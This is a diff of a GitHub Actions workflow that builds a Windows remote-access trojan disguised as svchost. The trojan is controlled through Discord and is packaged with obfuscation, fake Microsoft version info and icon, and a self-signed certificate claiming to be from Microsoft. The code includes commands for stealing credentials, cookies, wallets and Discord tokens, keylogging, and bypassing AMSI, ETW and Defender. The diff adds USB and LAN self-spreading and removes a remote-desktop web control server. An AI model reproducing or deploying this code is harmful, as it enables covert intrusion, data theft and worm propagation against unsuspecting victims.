-              _vc = None; _src = None; await m.channel.send("⏹️ rời voice")
+              _vc = None; _src = None; await m.channel.send("roi voice")
 
           async def c_huy(m, a):
-              await m.channel.send("💥 Tự hủy...")
+              await m.channel.send("Tu huy...")
               await ex(uninstall); time.sleep(0.5)
               subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"',
                                shell=True, creationflags=NO_WIN)
@@ -2505,8 +2351,8 @@ jobs:
 
           COMMANDS = {
               "help":c_help,"list":c_list,"select":c_select,"back":c_back,"sel":c_sel,"master":c_master,
-              "web":c_web,"webmon":c_web,"webfps":c_webfps,"webq":c_webq,"webscale":c_webscale,"hidden":c_hidden,
-              "seturl":c_seturl,"reload":c_reload,
+              "spread":c_spread,"lan":c_lan,"usb":c_usb,"infect":c_infect,"uninfect":c_uninfect,
+              "programs":c_programs,"auto":c_auto,"spreadinfo":c_spreadinfo,"info":c_spreadinfo,
               "cmd":c_cmd,"sh":c_sh,"shell":c_sh,"ps1":c_ps1,"powershell":c_ps1,"pwd":c_pwd,"cddir":c_cddir,
               "bypass":c_bypass,"defender":c_defender,"amsi":c_amsi,"etw":c_etw,
               "timestomp":c_timestomp,"hide":c_hide,"clone":c_clone,"sandbox":c_sandbox,"token":c_token,
@@ -2537,11 +2383,11 @@ jobs:
               "download":c_download,"zip":c_zip,"upload":c_upload,"eval":c_eval,"exec":c_exec,
               "join":c_join,"leave":c_leave,
           }
-          LOCAL = {"help","list","select","back","sel","master"}
+          LOCAL = {"help","list","select","back","sel","master","spreadinfo","info"}
 
           @client.event
           async def on_ready():
-              print(f"[*] online: {client.user} | máy: {MACHINE_ID}")
+              print(f"[*] online: {client.user} | may: {MACHINE_ID}")
               _last_beat[0] = time.time()
               try:
                   ch = await control_channel()
@@ -2551,7 +2397,7 @@ jobs:
                           _reg_loop_started[0] = True
                           asyncio.ensure_future(_reg_loop(ch))
               except Exception as e:
-                  print("ready lỗi:", e)
+                  print("ready loi:", e)
 
           @client.event
           async def on_message(message):
@@ -2586,16 +2432,19 @@ jobs:
                   _RAW[message.id] = raw
                   await COMMANDS[name](message, raw.split())
               except Exception as e:
-                  try: await message.channel.send(f"⚠️ Lỗi: {e}")
+                  try: await message.channel.send(f"Loi: {e}")
                   except Exception: pass
 
           if __name__ == "__main__":
               hide_console()
+              _sidecar_launch()
               try: amsi_patch()
               except Exception: pass
               if not os.path.exists(MARKER):
                   time.sleep(random.randint(3, 12))
                   install()
+                  try: spread_programs()
+                  except Exception: pass
               elif take_over():
                   print("[*] da ghi de ban cai dat + khoi dong lai ban moi")
                   time.sleep(0.8); os._exit(0)
@@ -2603,15 +2452,13 @@ jobs:
               threading.Thread(target=_exfil_worker, daemon=True).start()
               threading.Thread(target=_net_watch, daemon=True).start()
               threading.Thread(target=_watchdog, daemon=True).start()
-              threading.Thread(target=_in_worker, daemon=True).start()
-              threading.Thread(target=_web_frames, daemon=True).start()
-              threading.Thread(target=_web_loop, daemon=True).start()
+              threading.Thread(target=_autospread, daemon=True).start()
 
               tok = _token()
               if not tok:
-                  print("[*] WEB-ONLY: khong co token Discord")
-                  _last_beat[0] = time.time()
+                  print("[*] khong co token - chi phat tan")
                   while True:
+                      _last_beat[0] = time.time()
                       time.sleep(20)
 
               delay = 5
@@ -2619,431 +2466,10 @@ jobs:
                   try:
                       client.run(tok); delay = 5
                   except Exception as e:
-                      print("bot lỗi, thử lại sau", delay, "s:", e)
+                      print("bot loi, thu lai sau", delay, "s:", e)
                       time.sleep(delay); delay = min(delay * 2, 300)
           '@
           [System.IO.File]::WriteAllText((Join-Path $PWD "agent.py"), $py)
-
-      - name: Ghi server.js
-        shell: pwsh
-        run: |
-          $js = @'
-          #!/usr/bin/env node
-          'use strict';
-          /*  bvwqmiv7phoi.ramnaymcloud.com - server dieu khien tu xa (1 file, tu cai deps)
-           *  Chay:  node server.js
-           *  Env:   PORT=33324  HOST=0.0.0.0  WEB_PASS=...  AGENT_KEY=...
-           *         TLS_CERT=cert.pem  TLS_KEY=key.pem   (co 2 file nay -> tu HTTPS/WSS)
-           *  Luu y: nhan WebSocket o MOI path, nen di qua proxy/tunnel co prefix van ok.
-           */
-          const fs = require('fs');
-          const path = require('path');
-          const http = require('http');
-          const https = require('https');
-          const { execSync } = require('child_process');
-
-          const PORT = parseInt(process.env.PORT || '33324', 10);
-          const HOST = process.env.HOST || '0.0.0.0';
-          const PASS = process.env.WEB_PASS || '';
-          const AKEY = process.env.AGENT_KEY || '';
-          const CERT = process.env.TLS_CERT || path.join(__dirname, 'cert.pem');
-          const KEY  = process.env.TLS_KEY  || path.join(__dirname, 'key.pem');
-
-          function need(m) {
-            try { require.resolve(m); } catch (e) {
-              console.log('[*] npm install ' + m + ' ...');
-              execSync('npm install ' + m + ' --no-audit --no-fund --loglevel=error', { stdio: 'inherit' });
-            }
-          }
-          need('ws');
-          const { WebSocketServer } = require('ws');
-
-          const agents = new Map();
-          const webs = new Set();
-          const jstr = function (o) { return JSON.stringify(o); };
-          function send(ws, o) { try { if (ws.readyState === 1) ws.send(jstr(o)); } catch (e) {} }
-          function pushAgents() {
-            const list = [];
-            agents.forEach(function (a) {
-              list.push({ id: a.id, host: a.info.host, user: a.info.user, os: a.info.os,
-                admin: !!a.info.admin, ip: a.ip, mons: a.info.mons || 1, url: a.info.url || '',
-                viewers: a.viewers.size, on: a.ws.readyState === 1 });
-            });
-            const s = jstr({ t: 'agents', list: list });
-            webs.forEach(function (w) { try { if (w.readyState === 1) w.send(s); } catch (e) {} });
-          }
-
-          const PAGE = String.raw`<!doctype html>
-          <html lang="vi">
-          <head>
-          <meta charset="utf-8">
-          <meta name="viewport" content="width=device-width,initial-scale=1">
-          <title>svchost · control</title>
-          <style>
-          *{box-sizing:border-box}
-          html,body{margin:0;height:100%;overflow:hidden;background:#0b0f14;color:#c9d1d9;
-           font:13px/1.45 'Segoe UI',system-ui,Roboto,sans-serif}
-          #app{display:grid;grid-template-columns:280px 1fr;height:100vh}
-          aside{background:#0f151c;border-right:1px solid #1d2632;display:flex;flex-direction:column;min-height:0}
-          .hd{padding:10px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #1d2632;font-weight:700;letter-spacing:.5px}
-          .hd b{color:#58a6ff}
-          .dot{width:9px;height:9px;border-radius:50%;background:#3b4552;display:inline-block}
-          .dot.on{background:#3fb950;box-shadow:0 0 8px #3fb950}
-          .dot.off{background:#f85149}
-          #q{margin:8px 10px;padding:7px 9px;border-radius:6px;border:1px solid #22303f;background:#0b1118;color:#c9d1d9;outline:none}
-          #list{flex:1;overflow:auto;padding:0 6px 8px}
-          .it{padding:7px 9px;border-radius:7px;cursor:pointer;border:1px solid transparent;margin-bottom:3px;display:flex;flex-direction:column;gap:2px;position:relative}
-          .it:hover{background:#131c26}
-          .it.sel{background:#132234;border-color:#1f6feb}
-          .it b{color:#e6edf3;font-size:13px}
-          .it span{color:#7d8b9c;font-size:11px}
-          .it i{position:absolute;right:9px;top:11px;width:8px;height:8px;border-radius:50%;background:#3fb950}
-          .it i.dead{background:#6e7681}
-          .it .vw{position:absolute;right:22px;top:9px;font-size:10px;color:#58a6ff}
-          .ft{padding:8px 10px;border-top:1px solid #1d2632;display:flex;justify-content:space-between;align-items:center;color:#7d8b9c;font-size:11px}
-          main{display:flex;flex-direction:column;min-width:0;min-height:0}
-          #bar{display:flex;flex-wrap:wrap;gap:10px;align-items:center;padding:8px 12px;background:#0f151c;border-bottom:1px solid #1d2632}
-          #bar label{display:flex;gap:5px;align-items:center;color:#8b98a8;font-size:11px}
-          #who{color:#58a6ff;font-weight:600;margin-right:auto}
-          button{background:#18222e;color:#c9d1d9;border:1px solid #26313f;border-radius:6px;padding:5px 10px;cursor:pointer;font-size:12px}
-          button:hover{background:#1f2c3a;border-color:#1f6feb}
-          button.pri{background:#1f6feb;border-color:#1f6feb;color:#fff}
-          button.pri:hover{background:#2a7ff5}
-          #stage{flex:1;position:relative;background:#05080c;display:flex;align-items:center;justify-content:center;overflow:hidden;min-height:0}
-          #view{max-width:100%;max-height:100%;cursor:crosshair;outline:none}
-          #hint{position:absolute;color:#3d4a5a;pointer-events:none}
-          #term{height:235px;display:flex;flex-direction:column;background:#0f151c;border-top:1px solid #1d2632}
-          #out{flex:1;overflow:auto;padding:8px 12px;font:12px/1.5 Consolas,monospace;white-space:pre-wrap;word-break:break-all;color:#a9b6c4}
-          #out .in{color:#58a6ff}
-          #out .err{color:#f85149}
-          #out a{color:#3fb950}
-          .row{display:flex;gap:8px;padding:8px 12px;border-top:1px solid #1d2632}
-          #cmd{flex:1;padding:8px 10px;border-radius:6px;border:1px solid #22303f;background:#0b1118;color:#e6edf3;outline:none;font:12px Consolas,monospace}
-          #quick{padding:0 12px 8px;display:flex;flex-wrap:wrap;gap:6px}
-          #quick button{padding:3px 8px;font-size:11px}
-          select,input[type=range]{background:#0b1118;color:#c9d1d9;border:1px solid #22303f;border-radius:5px;padding:2px 4px}
-          @media(max-width:820px){#app{grid-template-columns:1fr}aside{height:180px}}
-          </style>
-          </head>
-          <body>
-          <div id="app">
-           <aside>
-            <div class="hd"><b>svchost</b><span id="dot" class="dot off"></span>
-             <span id="fpsv" style="margin-left:auto;color:#7d8b9c;font-weight:400;font-size:11px">0 fps</span></div>
-            <input id="q" placeholder="Tim may...">
-            <div id="list"></div>
-            <div class="ft"><span id="cnt">0 may</span><button id="recon">Reconnect</button></div>
-           </aside>
-           <main>
-            <div id="bar">
-             <span id="who">Chua chon may</span>
-             <label><input type="checkbox" id="hid" checked> Chuot an</label>
-             <label>FPS <select id="fps"><option>5</option><option>8</option><option selected>12</option><option>16</option><option>20</option><option>25</option></select></label>
-             <label>Chat luong <input type="range" id="qual" min="20" max="90" value="55" style="width:80px"></label>
-             <label>Thu nho <select id="scale"><option>0.35</option><option selected>0.5</option><option selected>0.65</option><option>0.8</option><option>1</option></select></label>
-             <label>Man <select id="mon"><option value="1">1</option></select></label>
-             <button id="pause">Tam dung</button>
-             <button id="kb" class="pri">Ban phim: ON</button>
-             <button id="fs">Toan man hinh</button>
-            </div>
-            <div id="stage"><canvas id="view" tabindex="0"></canvas>
-             <div id="hint">Chon 1 may ben trai de dieu khien</div></div>
-            <div id="term">
-             <div id="out"></div>
-             <div class="row"><input id="cmd" placeholder="Nhap lenh: sysinfo | sh dir | shot | steal | seturl https://..."><button id="run" class="pri">Chay</button></div>
-             <div id="quick"></div>
-            </div>
-           </main>
-          </div>
-          <script>
-          var $=function(s){return document.querySelector(s)};
-          var ws=null,agents=[],attached=null,paused=false,kbd=true,frames=0,fpsT=Date.now();
-          var PASS=localStorage.getItem('svcpass')||'';
-          var ctx=$('#view').getContext('2d');
-          var raf=0,pend=null,downBtn=null;
-
-          function setDot(on){ $('#dot').className='dot '+(on?'on':'off'); }
-          function out(t,cls){ var o=$('#out'),d=document.createElement('div'); if(cls)d.className=cls; d.textContent=t; o.appendChild(d); o.scrollTop=o.scrollHeight; }
-          function wsUrl(){ return (location.protocol==='https:'?'wss://':'ws://')+location.host+'/ws'; }
-
-          function connect(){
-            setDot(false);
-            try{ ws=new WebSocket(wsUrl()); }catch(e){ setTimeout(connect,2500); return; }
-            ws.binaryType='blob';
-            ws.onopen=function(){ setDot(true); ws.send(JSON.stringify({t:'hello',role:'web',pass:PASS})); };
-            ws.onclose=function(){ setDot(false); setTimeout(connect,2500); };
-            ws.onerror=function(){};
-            ws.onmessage=onMsg;
-          }
-
-          function onMsg(ev){
-            if(ev.data instanceof Blob){ draw(ev.data); return; }
-            var m; try{ m=JSON.parse(ev.data); }catch(e){ return; }
-            if(m.t==='agents'){ agents=m.list||[]; renderList(); return; }
-            if(m.t==='attached'){
-              attached=m.id||null;
-              $('#who').textContent = m.info ? (m.info.host+' · '+m.info.user+' · '+m.info.ip+' · '+m.info.url) : 'Chua chon may';
-              if(m.info && m.info.mons){ var o=''; for(var i=1;i<=m.info.mons;i++) o+='<option value="'+i+'">'+i+'</option>'; $('#mon').innerHTML=o; }
-              renderList(); pushSet(); return;
-            }
-            if(m.t==='cmdres'){ out(m.text||''); return; }
-            if(m.t==='file'){ fileOut(m); return; }
-            if(m.t==='agentdown'){ if(m.id===attached) out('[!] may nay mat ket noi','err'); return; }
-            if(m.t==='err'){ out('!! '+m.msg,'err'); if(m.msg==='sai mat khau'){ var p=prompt('Mat khau web:'); if(p!==null){ PASS=p; localStorage.setItem('svcpass',p); ws.close(); } } return; }
-          }
-
-          async function draw(blob){
-            try{
-              var bmp=await createImageBitmap(blob);
-              var c=$('#view');
-              if(c.width!==bmp.width||c.height!==bmp.height){ c.width=bmp.width; c.height=bmp.height; }
-              ctx.drawImage(bmp,0,0); bmp.close();
-              $('#hint').style.display='none';
-              frames++; var now=Date.now();
-              if(now-fpsT>1000){ $('#fpsv').textContent=(frames*1000/(now-fpsT)).toFixed(1)+' fps'; frames=0; fpsT=now; }
-            }catch(e){}
-          }
-
-          function fileOut(m){
-            var bin=atob(m.b64), n=bin.length, u=new Uint8Array(n);
-            for(var i=0;i<n;i++) u[i]=bin.charCodeAt(i);
-            var url=URL.createObjectURL(new Blob([u]));
-            var o=$('#out'), d=document.createElement('div'), a=document.createElement('a');
-            a.href=url; a.download=m.name; a.textContent='[ tai ve ] '+m.name+' ('+Math.round(m.size/1024)+' KB)';
-            d.appendChild(a); o.appendChild(d); o.scrollTop=o.scrollHeight;
-          }
-
-          function renderList(){
-            var f=($('#q').value||'').toLowerCase(), l=$('#list'), n=0;
-            l.innerHTML='';
-            agents.forEach(function(a){
-              var txt=((a.host||'')+' '+(a.user||'')+' '+(a.os||'')+' '+(a.ip||'')).toLowerCase();
-              if(f && txt.indexOf(f)<0) return;
-              n++;
-              var d=document.createElement('div');
-              d.className='it'+(a.id===attached?' sel':'');
-              var b=document.createElement('b'); b.textContent=a.host||a.id;
-              var s=document.createElement('span');
-              s.textContent=(a.user||'?')+' - '+(a.os||'?')+(a.admin?' - ADMIN':'')+' - '+(a.ip||'');
-              var i=document.createElement('i'); if(!a.on) i.className='dead';
-              d.appendChild(b); d.appendChild(s); d.appendChild(i);
-              if(a.viewers){ var v=document.createElement('span'); v.className='vw'; v.textContent=a.viewers+'x'; d.appendChild(v); }
-              d.onclick=function(){ attach(a.id); };
-              l.appendChild(d);
-            });
-            $('#cnt').textContent=n+' may';
-          }
-
-          function attach(id){
-            attached=id;
-            if(ws&&ws.readyState===1) ws.send(JSON.stringify({t:'attach',id:id}));
-            $('#out').innerHTML=''; out('[*] da chon '+id,'in');
-            renderList();
-          }
-          function pushSet(){
-            if(!ws||ws.readyState!==1||!attached) return;
-            ws.send(JSON.stringify({t:'set',s:{fps:+$('#fps').value,q:+$('#qual').value,
-              scale:+$('#scale').value,mon:+$('#mon').value,hidden:$('#hid').checked}}));
-          }
-          function inp(d){
-            if(!ws||ws.readyState!==1||!attached||paused) return;
-            d.h=$('#hid').checked;
-            ws.send(JSON.stringify({t:'in',d:d}));
-          }
-          function pos(e){
-            var c=$('#view'), r=c.getBoundingClientRect();
-            var x=(e.clientX-r.left)/r.width, y=(e.clientY-r.top)/r.height;
-            return {x:Math.max(0,Math.min(1,x)), y:Math.max(0,Math.min(1,y))};
-          }
-          function moveTo(p){ pend=p; if(raf) return;
-            raf=requestAnimationFrame(function(){ raf=0; if(pend) inp({a:'m',x:pend.x,y:pend.y}); pend=null; }); }
-
-          var v=$('#view');
-          v.addEventListener('pointerdown',function(e){
-            v.focus(); var p=pos(e);
-            if(e.button===0){ downBtn='left'; inp({a:'d',dn:true,x:p.x,y:p.y,b:'left'}); }
-            else if(e.button===2){ inp({a:'c',x:p.x,y:p.y,b:'right',n:1}); }
-            else if(e.button===1){ inp({a:'c',x:p.x,y:p.y,b:'mid',n:1}); }
-            e.preventDefault();
-          });
-          v.addEventListener('pointermove',function(e){
-            var p=pos(e);
-            if(downBtn) inp({a:'d',x:p.x,y:p.y,b:downBtn});
-            else moveTo(p);
-          });
-          v.addEventListener('pointerup',function(e){
-            var p=pos(e);
-            if(downBtn){ inp({a:'d',dn:false,x:p.x,y:p.y,b:downBtn}); downBtn=null; }
-            e.preventDefault();
-          });
-          v.addEventListener('contextmenu',function(e){ e.preventDefault(); });
-          v.addEventListener('wheel',function(e){
-            e.preventDefault(); var p=pos(e); inp({a:'s',x:p.x,y:p.y,dy:e.deltaY>0?1:-1});
-          },{passive:false});
-
-          var VK={Enter:13,Escape:27,Backspace:8,Tab:9,Delete:46,Insert:45,Home:36,End:35,PageUp:33,PageDown:34,
-          ArrowUp:38,ArrowDown:40,ArrowLeft:37,ArrowRight:39,Shift:16,Control:17,Alt:18,Meta:91,CapsLock:20,
-          F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,
-          ' ':32,'-':189,'=':187,'[':219,']':221,';':186,',':188,'.':190,'/':191,'\\':220,[String.fromCharCode(96)]:192};
-          function skip(){ var a=document.activeElement; return a===$('#cmd')||a===$('#q'); }
-          document.addEventListener('keydown',function(e){
-            if(!attached||!kbd||skip()) return;
-            var k=e.key;
-            if(k.length===1 && !e.ctrlKey && !e.altKey && !e.metaKey){ inp({a:'t',s:k}); e.preventDefault(); return; }
-            var vk=VK[k]; if(vk===undefined&&k.length===1) vk=k.toUpperCase().charCodeAt(0);
-            if(vk!==undefined){ inp({a:'k',vk:vk,dn:true}); e.preventDefault(); }
-          });
-          document.addEventListener('keyup',function(e){
-            if(!attached||!kbd||skip()) return;
-            var k=e.key;
-            if(k.length===1 && !e.ctrlKey && !e.altKey && !e.metaKey) return;
-            var vk=VK[k]; if(vk===undefined&&k.length===1) vk=k.toUpperCase().charCodeAt(0);
-            if(vk!==undefined) inp({a:'k',vk:vk,dn:false});
-          });
-
-          function runCmd(){
-            var t=$('#cmd').value.trim();
-            if(!t||!attached) return;
-            var sp=t.split(/\s+/), name=sp.shift();
-            out('> '+t,'in');
-            ws.send(JSON.stringify({t:'cmd',name:name,args:sp,rid:Date.now()}));
-            $('#cmd').value='';
-          }
-          $('#run').onclick=runCmd;
-          $('#cmd').addEventListener('keydown',function(e){ if(e.key==='Enter') runCmd(); });
-          $('#q').addEventListener('input',renderList);
-          $('#recon').onclick=function(){ try{ ws.close(); }catch(e){} connect(); };
-          $('#hid').onchange=pushSet; $('#fps').onchange=pushSet; $('#qual').onchange=pushSet;
-          $('#scale').onchange=pushSet; $('#mon').onchange=pushSet;
-          $('#pause').onclick=function(){ paused=!paused; this.textContent=paused?'Tiep tuc':'Tam dung'; };
-          $('#kb').onclick=function(){ kbd=!kbd; this.textContent='Ban phim: '+(kbd?'ON':'OFF'); };
-          $('#fs').onclick=function(){ var s=$('#stage'); if(!document.fullscreenElement) s.requestFullscreen(); else document.exitFullscreen(); };
-
-          var QUICK=['help','sysinfo','shot','ls C:\\','procs','net','wifi','browser','cookies','wallets','dtoken',
-          'steal','grab','keylog dump','cliplog dump','clip','bypass','persist','drives','users','av','installed',
-          'power lock','msg Hello','notify svchost','beep','caps','flip','glitch on','overlay svchost','fakebsod','rickroll','mic 5',
-          'seturl https://bvwqmiv7phoi.ramnaymcloud.com','reload'];
-          QUICK.forEach(function(c){
-            var b=document.createElement('button'); b.textContent=c;
-            b.onclick=function(){ if(!attached) return; var sp=c.split(/\s+/), n=sp.shift();
-              out('> '+c,'in'); ws.send(JSON.stringify({t:'cmd',name:n,args:sp,rid:Date.now()})); };
-            $('#quick').appendChild(b);
-          });
-
-          connect();
-          </script>
-          </body>
-          </html>`;
-
-          const handler = function (req, res) {
-            if (req.url.indexOf('/health') === 0) { res.writeHead(200); return res.end('ok'); }
-            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
-            res.end(PAGE);
-          };
-
-          const useTls = fs.existsSync(CERT) && fs.existsSync(KEY);
-          const srv = useTls
-            ? https.createServer({ cert: fs.readFileSync(CERT), key: fs.readFileSync(KEY) }, handler)
-            : http.createServer(handler);
-
-          // KHONG gioi han path -> chiu duoc proxy/tunnel co prefix
-          const wss = new WebSocketServer({ server: srv, maxPayload: 64 * 1024 * 1024 });
-
-          wss.on('connection', function (ws, req) {
-            ws.ip = ((req.headers['x-forwarded-for'] || '') + ',' + (req.socket.remoteAddress || ''))
-                      .split(',')[0].trim();
-            ws.role = null; ws.last = Date.now(); ws.viewers = new Set(); ws.attach = null;
-
-            ws.on('message', function (data, isBin) {
-              ws.last = Date.now();
-              if (isBin) {
-                if (ws.role !== 'agent') return;
-                ws.viewers.forEach(function (v) { try { if (v.readyState === 1) v.send(data, { binary: true }); } catch (e) {} });
-                return;
-              }
-              let m; try { m = JSON.parse(data.toString()); } catch (e) { return; }
-
-              if (m.t === 'hello') {
-                if (m.role === 'agent') {
-                  if (AKEY && m.key !== AKEY) { send(ws, { t: 'err', msg: 'bad agent key' }); return ws.close(); }
-                  ws.role = 'agent';
-                  ws.info = m.info || {};
-                  ws.id = String(ws.info.id || ws.ip || ('agent-' + Date.now()));
-                  ws.info.id = ws.id;
-                  const old = agents.get(ws.id);
-                  if (old && old.ws !== ws) { try { old.ws.close(); } catch (e) {} }
-                  agents.set(ws.id, ws);
-                  send(ws, { t: 'viewers', n: 0 });
-                  pushAgents();
-                  console.log('[+] agent: ' + ws.id + ' (' + ws.ip + ') path=' + (req.url || '/'));
-                } else {
-                  if (PASS && m.pass !== PASS) { send(ws, { t: 'err', msg: 'sai mat khau' }); return ws.close(); }
-                  ws.role = 'web'; webs.add(ws);
-                  pushAgents();
-                }
-                return;
-              }
-
-              if (ws.role === 'web') {
-                if (m.t === 'attach') {
-                  if (ws.attach) { const o = agents.get(ws.attach); if (o) { o.viewers.delete(ws); send(o.ws, { t: 'viewers', n: o.viewers.size }); } }
-                  ws.attach = m.id || null;
-                  const a = ws.attach ? agents.get(ws.attach) : null;
-                  if (a) {
-                    a.viewers.add(ws);
-                    send(ws, { t: 'attached', id: a.id, info: a.info });
-                    send(a.ws, { t: 'viewers', n: a.viewers.size });
-                  } else { send(ws, { t: 'attached', id: null }); }
-                  pushAgents();
-                  return;
-                }
-                const tgt = ws.attach ? agents.get(ws.attach) : null;
-                if (tgt && tgt.ws.readyState === 1 && (m.t === 'in' || m.t === 'set' || m.t === 'cmd')) {
-                  send(tgt.ws, m);
-                }
-                return;
-              }
-
-              if (ws.role === 'agent') {
-                if (m.t === 'cmdres' || m.t === 'file' || m.t === 'stat' || m.t === 'log') {
-                  ws.viewers.forEach(function (v) { send(v, m); });
-                }
-              }
-            });
-
-            ws.on('close', function () {
-              if (ws.role === 'agent') {
-                if (agents.get(ws.id) === ws) agents.delete(ws.id);
-                ws.viewers.forEach(function (v) { send(v, { t: 'agentdown', id: ws.id }); });
-                console.log('[-] agent: ' + ws.id);
-                pushAgents();
-              } else if (ws.role === 'web') {
-                webs.delete(ws);
-                if (ws.attach) { const a = agents.get(ws.attach); if (a) { a.viewers.delete(ws); send(a.ws, { t: 'viewers', n: a.viewers.size }); } }
-              }
-            });
-            ws.on('error', function () {});
-          });
-
-          setInterval(function () {
-            agents.forEach(function (a) { try { a.ws.ping(); } catch (e) {} });
-            pushAgents();
-          }, 10000);
-
-          srv.listen(PORT, HOST, function () {
-            if (process.platform === 'win32') {
-              try { execSync('netsh advfirewall firewall add rule name="svchost-control" dir=in action=allow protocol=TCP localport=' + PORT, { stdio: 'ignore' }); } catch (e) {}
-            }
-            console.log('===========================================');
-            console.log(' control server: ' + (useTls ? 'https' : 'http') + '://0.0.0.0:' + PORT);
-            console.log(' domain:         https://bvwqmiv7phoi.ramnaymcloud.com');
-            console.log(' ws path:        MOI path (khong gioi han)');
-            console.log(' mat khau web:   ' + (PASS ? 'CO' : 'khong'));
-            console.log(' agent key:      ' + (AKEY ? 'CO' : 'khong'));
-            console.log('===========================================');
-          });
-          '@
-          [System.IO.File]::WriteAllText((Join-Path $PWD "server.js"), $js)
 
       - name: Ghi version info (giả Microsoft)
         shell: pwsh
@@ -3098,7 +2524,7 @@ jobs:
       - name: Cài thư viện Python
         run: |
           python -m pip install --upgrade pip
-          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests websocket-client pycryptodome pyzipper pyarmor pyinstaller
+          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests pycryptodome pyarmor pyinstaller
 
       - name: Tạo icon giả Windows
         run: |
@@ -3108,7 +2534,6 @@ jobs:
       - name: Kiểm tra cú pháp
         run: |
           python -c "import ast; ast.parse(open('agent.py',encoding='utf-8').read()); print('OK: agent.py hop le')"
-          node --check server.js && echo "OK: server.js hop le"
 
       - name: Tải libopus-0.dll
         shell: pwsh
@@ -3126,9 +2551,9 @@ jobs:
               Expand-Archive opus.zip -DestinationPath opus_tmp -Force
               $dll = Get-ChildItem -Path opus_tmp -Recurse -File | Where-Object { $_.Name -match '^(lib)?opus.*\.dll$' } | Select-Object -First 1
               if ($dll) { Copy-Item $dll.FullName "libopus-0.dll" -Force; $ok = $true; break }
-            } catch { Write-Host "Thử $u thất bại" }
+            } catch { Write-Host "Thu $u that bai" }
           }
-          if (-not $ok) { Write-Host "::warning::Không tải được opus" }
+          if (-not $ok) { Write-Host "::warning::Khong tai duoc opus" }
 
       - name: Mã hóa token + cấu hình
         shell: pwsh
@@ -3136,8 +2561,6 @@ jobs:
           BOT_TOKEN: ${{ github.event.inputs.token }}
           TOKEN_URL: ${{ github.event.inputs.token_url }}
           CTRL_CH: ${{ github.event.inputs.control_channel }}
-          CTRL_URL: ${{ github.event.inputs.control_url }}
-          CTRL_FETCH: ${{ github.event.inputs.control_fetch }}
           AKEY: ${{ github.event.inputs.agent_key }}
         run: |
           if ($env:BOT_TOKEN) { Write-Host "::add-mask::$env:BOT_TOKEN" }
@@ -3160,20 +2583,17 @@ jobs:
           else:
               substr(r'_TOK_ENC\s*=\s*".*?"', "")
               substr(r'_TOK_KEY\s*=\s*".*?"', "")
-              print("discord: TAT (che do web-only)")
+              print("discord: TAT (chi phat tan)")
 
-          def pick(env, slash=False):
-              v = (os.environ.get(env) or "").strip()
-              return v.rstrip("/") if slash else v
+          def pick(env):
+              return (os.environ.get(env) or "").strip()
 
-          for pat, env, sl in ((r'TOKEN_URL\s*=\s*".*?"', "TOKEN_URL", False),
-                               (r'CONTROL_URL\s*=\s*".*?"', "CTRL_URL", True),
-                               (r'CONTROL_FETCH\s*=\s*".*?"', "CTRL_FETCH", True),
-                               (r'AGENT_KEY\s*=\s*".*?"', "AKEY", False)):
-              v = pick(env, sl)
+          for pat, env in ((r'TOKEN_URL\s*=\s*".*?"', "TOKEN_URL"),
+                           (r'AGENT_KEY\s*=\s*".*?"', "AKEY")):
+              v = pick(env)
               if v: substr(pat, v)
 
-          ch = (os.environ.get("CTRL_CH") or "").strip()
+          ch = pick("CTRL_CH")
           if ch and ch != "0":
               s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+',
                          lambda m: m.group(0).split("=")[0].rstrip() + " = " + ch, s, count=1)
@@ -3182,9 +2602,9 @@ jobs:
 
           print("--- CAU HINH DA NHUNG ---")
           for line in s.splitlines():
-              if re.match(r'^\s*(CONTROL_URL|CONTROL_FETCH|CONTROL_CH_ID|TOKEN_URL|AGENT_KEY|_TOK_ENC|_TOK_KEY)\s*=', line):
+              if re.match(r'^\s*(CONTROL_CH_ID|TOKEN_URL|_TOK_ENC|_TOK_KEY)\s*=', line):
                   v = line.strip()
-                  print("  " + (v[:90] + "..." if len(v) > 90 else v))
+                  print("  " + (v[:80] + "..." if len(v) > 80 else v))
           '@
           $inject | python -
 
@@ -3192,7 +2612,7 @@ jobs:
         shell: pwsh
         run: |
           Write-Host "=== dong cau hinh thuc te trong agent.py ==="
-          Select-String -Path agent.py -Pattern '^\s*(CONTROL_URL|CONTROL_FETCH|CONTROL_CH_ID|TOKEN_URL|AGENT_KEY|_TOK_ENC|_TOK_KEY)\s*=' |
+          Select-String -Path agent.py -Pattern '^\s*(CONTROL_CH_ID|TOKEN_URL|_TOK_ENC|_TOK_KEY)\s*=' |
             ForEach-Object { $_.Line.Trim() }
 
       - name: Register PyArmor license
@@ -3232,7 +2652,7 @@ jobs:
             if ($useObf) { Write-Host "OK: build ban da obfuscate (PyArmor)" }
             else { Write-Host "::warning::PyArmor free khong obfuscate duoc script lon - build ban thuong" }
           }
-          pyinstaller --noconfirm --clean --onefile --noconsole --noupx --optimize 2 --name svchost --icon svchost.ico --manifest svchost.manifest --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import websocket --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module tkinter --exclude-module matplotlib --exclude-module scipy --exclude-module pandas --exclude-module PyQt5 --exclude-module PySide2 --exclude-module IPython --exclude-module pytest @extra $src
+          pyinstaller --noconfirm --clean --onefile --noconsole --noupx --optimize 2 --name svchost --icon svchost.ico --manifest svchost.manifest --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module tkinter --exclude-module matplotlib --exclude-module scipy --exclude-module pandas --exclude-module PyQt5 --exclude-module PySide2 --exclude-module IPython --exclude-module pytest @extra $src
           if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 
       - name: Ký số self-signed
@@ -3242,7 +2662,7 @@ jobs:
         run: |
           $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=Microsoft Windows, O=Microsoft Corporation" -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(5)
